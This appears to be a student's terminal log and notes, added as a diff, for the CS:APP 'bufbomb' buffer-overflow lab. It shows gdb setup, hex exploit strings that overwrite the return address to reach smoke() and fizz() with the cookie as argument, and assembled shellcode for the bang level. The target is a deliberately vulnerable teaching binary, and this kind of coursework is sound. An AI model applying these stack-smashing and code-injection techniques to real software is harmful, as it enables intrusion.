@@ -1,0 +1,68 @@
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# ./makecookie SA21218058
+0x63d2647a
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# gdb bufbomb 
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bufbomb...
+(gdb) b *0x08048fe0
+Breakpoint 1 at 0x8048fe0
+(gdb) info b
+Num     Type           Disp Enb Address    What
+1       breakpoint     keep y   0x08048fe0 <getbuf>
+(gdb) r -t SA21218058
+Starting program: /root/vsCodeProjects/csappLab/lab3/Experiment3/bufbomb -t SA21218058
+Team: SA21218058
+Cookie: 0x63d2647a
+
+
+
+## lab1
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# cat smoke.txt 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 8e 04 08
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# ./sendstring <exploit.txt >exploit-raw.txt 
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# hexdump exploit-raw.txt 
+0000000 0000 0000 0000 0000 0000 0000 0000 0000
+0000010 8e20 0804 000a                         
+0000015
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# ./bufbomb -t SA21218058 < exploit-raw.txt 
+Team: SA21218058
+Cookie: 0x63d2647a
+Type string:Smoke!: You called smoke()
+NICE JOB!
+Sent validation information to grading server
+
+
+## lab2
+跟lab1一样，就是需要传入一个int参数，且要和cookie相等
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 8d 04 08 00 00 00 00 7a 64 d2 63
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# ./sendstring <fizz.txt > exploit-raw.txt 
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# ./bufbomb -t SA21218058 < exploit-raw.txt 
+Team: SA21218058
+Cookie: 0x63d2647a
+Type string:Fizz!: You called fizz(0x63d2647a)
+NICE JOB!
+Sent validation information to grading server
+
+## lab3
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# gcc -m32 -c bang.s
+root@VM5811-oslab:~/vsCodeProjects/csappLab/lab3/Experiment3# objdump -d bang.o
+bang.o：     文件格式 elf32-i386
+Disassembly of section .text:
+00000000 <.text>:
+   0:	c7 05 dc a1 04 08 7a 	movl   $0x63d2647a,0x804a1dc
+   7:	64 d2 63 
+   a:	68 60 8d 04 08       	push   $0x8048d60
+   f:	c3                   	ret    
